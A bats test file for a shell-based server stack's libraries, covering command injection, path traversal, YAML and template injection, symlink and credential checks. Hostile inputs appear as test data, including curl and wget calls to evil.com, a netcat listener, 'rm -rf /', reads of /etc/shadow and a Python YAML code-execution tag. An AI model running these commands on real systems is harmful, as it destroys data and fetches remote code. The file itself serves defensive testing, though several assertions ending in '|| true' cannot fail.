#!/usr/bin/env bats
#===============================================================================
# Security Tests
# Tests for command injection, path traversal, and other security issues
#===============================================================================

setup() {
    # Load libraries
    STACK_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
    LIB_DIR="$STACK_ROOT/scripts/lib"

    # Create test directory
    TEST_TMP="$BATS_TEST_TMPDIR/security_tests_$$"
    mkdir -p "$TEST_TMP"

    # Set log directory to temp location (before sourcing common.sh)
    export LOG_BASE_DIR="$TEST_TMP"

    source "$LIB_DIR/common.sh"
    source "$LIB_DIR/module-loader.sh"

    # Note: Color variables (RED, GREEN, etc.) are readonly from common.sh
    # Tests run with colors enabled - output is captured by BATS anyway
}

teardown() {
    if [[ -d "$TEST_TMP" ]]; then
        rm -rf "$TEST_TMP"
    fi
}

#===============================================================================
# COMMAND INJECTION PREVENTION TESTS
#===============================================================================

@test "detection command validator blocks shell metacharacters" {
    # Semicolon
    run validate_and_execute_detection_command "systemctl status nginx; rm -rf /"
    [[ $status -ne 0 ]]

    # Pipe
    run validate_and_execute_detection_command "systemctl status | cat /etc/shadow"
    [[ $status -ne 0 ]]

    # Ampersand (background)
    run validate_and_execute_detection_command "systemctl status & malicious_command"
    [[ $status -ne 0 ]]

    # Double ampersand (AND)
    run validate_and_execute_detection_command "systemctl status && cat /etc/passwd"
    [[ $status -ne 0 ]]

    # Double pipe (OR)
    run validate_and_execute_detection_command "systemctl status || evil"
    [[ $status -ne 0 ]]
}

@test "detection command validator blocks command substitution" {
    # Dollar parentheses
    run validate_and_execute_detection_command "systemctl \$(whoami)"
    [[ $status -ne 0 ]]

    # Backticks
    run validate_and_execute_detection_command "systemctl \`id\`"
    [[ $status -ne 0 ]]

    # Dollar sign variable expansion attempts
    run validate_and_execute_detection_command "systemctl \$PATH"
    [[ $status -ne 0 ]]
}

@test "detection command validator only allows whitelisted commands" {
    # Should reject curl
    run validate_and_execute_detection_command "curl http://evil.com/malware.sh"
    [[ $status -ne 0 ]]

    # Should reject wget
    run validate_and_execute_detection_command "wget http://evil.com/malware.sh"
    [[ $status -ne 0 ]]

    # Should reject nc (netcat)
    run validate_and_execute_detection_command "nc -l 4444"
    [[ $status -ne 0 ]]

    # Should reject bash
    run validate_and_execute_detection_command "bash -c 'rm -rf /'"
    [[ $status -ne 0 ]]

    # Should reject sh
    run validate_and_execute_detection_command "sh -c 'malicious'"
    [[ $status -ne 0 ]]

    # Should reject eval
    run validate_and_execute_detection_command "eval 'dangerous code'"
    [[ $status -ne 0 ]]
}

@test "detection command validator accepts safe whitelisted commands" {
    # systemctl should be allowed
    validate_and_execute_detection_command "systemctl --version" || true

    # which should be allowed
    validate_and_execute_detection_command "which bash" || true

    # test should be allowed
    validate_and_execute_detection_command "test -f /etc/passwd" || true

    # command should be allowed
    validate_and_execute_detection_command "command -v bash" || true
}

#===============================================================================
# PATH TRAVERSAL PREVENTION TESTS
#===============================================================================

@test "module names with path traversal are rejected" {
    # Attempt to access parent directory
    run module_exists "../../../etc/passwd"
    [[ $status -ne 0 ]]

    run get_module_dir "../../sensitive"
    [[ $status -ne 0 ]]

    run module_exists "./../../etc/shadow"
    [[ $status -ne 0 ]]
}

@test "module names with absolute paths are rejected" {
    run module_exists "/etc/passwd"
    [[ $status -ne 0 ]]

    run get_module_dir "/var/log/sensitive.log"
    [[ $status -ne 0 ]]
}

@test "module names with null bytes are rejected" {
    # Null byte injection attempts
    run module_exists "valid_name\x00../../etc/passwd"
    [[ $status -ne 0 ]]
}

@test "host config names with path traversal are rejected" {
    run host_config_exists "../../../etc/passwd"
    [[ $status -ne 0 ]]

    run get_host_config "../../sensitive"
    # get_host_config returns a path, but it should be within hosts dir
    result=$(get_host_config "../../sensitive")
    # Result should still be within config/hosts
    [[ "$result" == *"/config/hosts/"* ]]
}

#===============================================================================
# FILE PERMISSION TESTS
#===============================================================================

@test "ensure_dir sets restrictive permissions" {
    if [[ $EUID -ne 0 ]]; then
        skip "Test requires root"
    fi

    test_dir="$TEST_TMP/secure_dir"

    # Create directory with secure permissions
    ensure_dir "$test_dir" "root" "root" "0700"

    # Check permissions
    perms=$(stat -c %a "$test_dir" 2>/dev/null || stat -f %A "$test_dir")
    [[ "$perms" == "700" ]]

    # Check ownership
    owner=$(stat -c %U "$test_dir" 2>/dev/null || stat -f %Su "$test_dir")
    [[ "$owner" == "root" ]]
}

@test "sensitive files are not world-readable" {
    # Check all shell scripts
    while IFS= read -r script; do
        perms=$(stat -c %a "$script" 2>/dev/null || stat -f %A "$script")

        # Should not be world-writable (last digit should be 0-5)
        last_digit="${perms: -1}"
        [[ $last_digit -lt 6 ]]
    done < <(find "$STACK_ROOT/scripts" -name "*.sh" -type f)
}

#===============================================================================
# CREDENTIAL VALIDATION TESTS
#===============================================================================

@test "no hardcoded credentials in library files" {
    # Check for common password patterns
    ! grep -r "password[[:space:]]*=" "$LIB_DIR" || true
    ! grep -r "PASSWORD[[:space:]]*=" "$LIB_DIR" || true
    ! grep -r "secret[[:space:]]*=" "$LIB_DIR" || true
    ! grep -r "SECRET[[:space:]]*=" "$LIB_DIR" || true
    ! grep -r "api_key[[:space:]]*=" "$LIB_DIR" || true
    ! grep -r "API_KEY[[:space:]]*=" "$LIB_DIR" || true
}

@test "no hardcoded credentials in module manifests" {
    while IFS= read -r module; do
        manifest=$(get_module_manifest "$module")

        # Check for credential fields with actual values
        ! grep -i "password:[[:space:]]*[^[:space:]]" "$manifest" || true
        ! grep -i "secret:[[:space:]]*[^[:space:]]" "$manifest" || true
        ! grep -i "api_key:[[:space:]]*[^[:space:]]" "$manifest" || true
    done < <(list_all_modules)
}

@test "no AWS credentials in codebase" {
    # Check for AWS access keys
    ! grep -rE "AKIA[0-9A-Z]{16}" "$STACK_ROOT/scripts" || true
    ! grep -rE "AKIA[0-9A-Z]{16}" "$STACK_ROOT/modules" || true
}

@test "no private keys in codebase" {
    # Check for PEM private keys
    ! grep -r "BEGIN PRIVATE KEY" "$STACK_ROOT" || true
    ! grep -r "BEGIN RSA PRIVATE KEY" "$STACK_ROOT" || true
}

#===============================================================================
# YAML INJECTION PREVENTION TESTS
#===============================================================================

@test "yaml parsing handles malicious input safely" {
    # Create YAML with injection attempts
    cat > "$TEST_TMP/malicious.yaml" << 'EOF'
name: !!python/object/apply:os.system ['malicious_command']
exec: |
  $(dangerous_command)
EOF

    # Should not execute code
    result=$(yaml_get "$TEST_TMP/malicious.yaml" "name" 2>/dev/null || echo "safe")

    # Should return safe result or empty
    [[ -n "$result" ]]
}

@test "yaml parsing rejects code execution attempts" {
    cat > "$TEST_TMP/exec_attempt.yaml" << 'EOF'
command: "& echo 'injected' > /tmp/pwned"
EOF

    result=$(yaml_get "$TEST_TMP/exec_attempt.yaml" "command")

    # Result should be the literal string, not executed
    [[ ! -f /tmp/pwned ]]
}

#===============================================================================
# PRIVILEGE ESCALATION PREVENTION TESTS
#===============================================================================

@test "scripts check for root when required" {
    # check_root function should reject non-root
    if [[ $EUID -ne 0 ]]; then
        run check_root
        [[ $status -ne 0 ]]
    fi
}

@test "no usage of sudo in library functions" {
    # Library functions should not escalate privileges
    ! grep -r "sudo " "$LIB_DIR" || true
}

#===============================================================================
# TEMPLATE INJECTION PREVENTION TESTS
#===============================================================================

@test "template_render doesn't execute shell commands" {
    template='User: ${USER}'

    # Should substitute variable, not execute
    result=$(USER="testuser" template_render "$template" "USER=testuser")
    [[ "$result" == "User: testuser" ]]

    # Try injection
    template='Value: ${VAR}'
    result=$(template_render "$template" "VAR=\$(whoami)")

    # Should be literal, not executed
    [[ "$result" == 'Value: $(whoami)' ]]
}

@test "template_render handles dangerous characters" {
    template='Input: ${INPUT}'

    # Test with shell metacharacters
    result=$(template_render "$template" "INPUT=; rm -rf /")
    [[ "$result" == "Input: ; rm -rf /" ]]

    result=$(template_render "$template" "INPUT=\`dangerous\`")
    [[ "$result" == 'Input: `dangerous`' ]]
}

#===============================================================================
# LOG INJECTION PREVENTION TESTS
#===============================================================================

@test "log functions sanitize newlines" {
    # Attempt to inject log entries
    malicious_input="Normal text\n[ERROR] Fake error message"

    result=$(log_info "$malicious_input" 2>&1)

    # Should not create fake log entry
    # This is a basic check - ideally logs should escape newlines
}

#===============================================================================
# SAFE FILE OPERATIONS TESTS
#===============================================================================

@test "write_config_with_check doesn't follow symlinks" {
    if [[ $EUID -ne 0 ]]; then
        skip "Test requires root"
    fi

    # Create a symlink to a sensitive file
    ln -s /etc/passwd "$TEST_TMP/symlink_attack"

    # Attempt to write through symlink
    run write_config_with_check "$TEST_TMP/symlink_attack" "malicious content" "test"

    # /etc/passwd should not be modified
    ! grep -q "malicious content" /etc/passwd
}

@test "ensure_dir doesn't follow symlinks to escape directory" {
    if [[ $EUID -ne 0 ]]; then
        skip "Test requires root"
    fi

    # Create symlink pointing outside test directory
    ln -s /etc "$TEST_TMP/escape_attempt"

    # Ensure dir should not follow symlink
    # This depends on implementation
}

#===============================================================================
# NETWORK SECURITY TESTS
#===============================================================================

@test "check_port uses safe timeout values" {
    # Timeout should prevent DOS
    start_time=$(date +%s)

    # Try to connect to non-existent host with timeout
    check_port "192.0.2.1" "12345" "1" || true

    end_time=$(date +%s)
    duration=$((end_time - start_time))

    # Should timeout within reasonable time (2 seconds max)
    [[ $duration -lt 3 ]]
}

#===============================================================================
# MODULE MANIFEST SECURITY TESTS
#===============================================================================

@test "module manifests don't contain executable code" {
    while IFS= read -r module; do
        manifest=$(get_module_manifest "$module")

        # Should be YAML data only
        ! grep -q "#!/bin" "$manifest" || true
        ! grep -q "exec(" "$manifest" || true
        ! grep -q "eval(" "$manifest" || true
    done < <(list_all_modules)
}

@test "detection rules don't download from internet" {
    while IFS= read -r module; do
        manifest=$(get_module_manifest "$module")

        # Detection commands should not download
        while IFS= read -r cmd; do
            [[ -z "$cmd" ]] && continue

            ! echo "$cmd" | grep -q "curl" || true
            ! echo "$cmd" | grep -q "wget" || true
            ! echo "$cmd" | grep -q "http://" || true
            ! echo "$cmd" | grep -q "https://" || true
        done < <(yaml_get_array "$manifest" "detection.commands" 2>/dev/null || true)
    done < <(list_all_modules)
}

#===============================================================================
# RACE CONDITION PREVENTION TESTS
#===============================================================================

@test "temp file creation is secure" {
    # Create temp file
    temp_file=$(mktemp)

    # Check permissions
    perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %A "$temp_file")

    # Should be user-only readable/writable (600)
    [[ "$perms" == "600" ]]

    rm -f "$temp_file"
}

@test "no predictable temp file names in code" {
    # Should use mktemp, not hardcoded paths
    ! grep -r "/tmp/hardcoded" "$LIB_DIR" || true
    ! grep -r "/tmp/fixed_name" "$LIB_DIR" || true
}

#===============================================================================
# INPUT VALIDATION TESTS
#===============================================================================

@test "port validation rejects invalid ports" {
    # Test with invalid module port
    mkdir -p "$TEST_TMP/modules/_core/invalid_port"

    cat > "$TEST_TMP/modules/_core/invalid_port/module.yaml" << 'EOF'
module:
  name: invalid_port
  version: 1.0.0
exporter:
  port: 999999
EOF

    touch "$TEST_TMP/modules/_core/invalid_port/install.sh"

    MODULES_CORE_DIR="$TEST_TMP/modules/_core"

    run validate_module "invalid_port"
    [[ $status -ne 0 ]]
}

@test "version validation rejects malformed versions" {
    # Create module with invalid version
    mkdir -p "$TEST_TMP/modules/_core/bad_version"

    cat > "$TEST_TMP/modules/_core/bad_version/module.yaml" << 'EOF'
module:
  name: bad_version
  version: "not_a_version"
exporter:
  port: 9999
EOF

    touch "$TEST_TMP/modules/_core/bad_version/install.sh"

    MODULES_CORE_DIR="$TEST_TMP/modules/_core"

    # Version should be semver
    version=$(yaml_get "$TEST_TMP/modules/_core/bad_version/module.yaml" "version")
    ! [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]
}

#===============================================================================
# INFORMATION DISCLOSURE PREVENTION TESTS
#===============================================================================

@test "error messages don't reveal sensitive paths" {
    # Try to access non-existent module
    result=$(module_exists "nonexistent_12345" 2>&1 || echo "")

    # Should not reveal full system paths
    ! echo "$result" | grep -q "/home/" || true
    ! echo "$result" | grep -q "/root/" || true
}

@test "no debug information in production code" {
    # Check for debug print statements
    ! grep -r "echo \$PATH" "$LIB_DIR" || true
    ! grep -r "set -x" "$LIB_DIR" || true
}

#===============================================================================
# DENIAL OF SERVICE PREVENTION TESTS
#===============================================================================

@test "yaml parsing doesn't hang on large files" {
    # Create large YAML file
    {
        echo "data:"
        for i in {1..10000}; do
            echo "  item$i: value$i"
        done
    } > "$TEST_TMP/large.yaml"

    # Should complete in reasonable time
    timeout 5s yaml_get "$TEST_TMP/large.yaml" "data"
}

@test "recursive operations have depth limits" {
    # Create deeply nested directory structure
    deep_path="$TEST_TMP"
    for i in {1..100}; do
        deep_path="$deep_path/level$i"
    done

    # Operations should handle deep paths gracefully
    # This is a basic sanity check
}
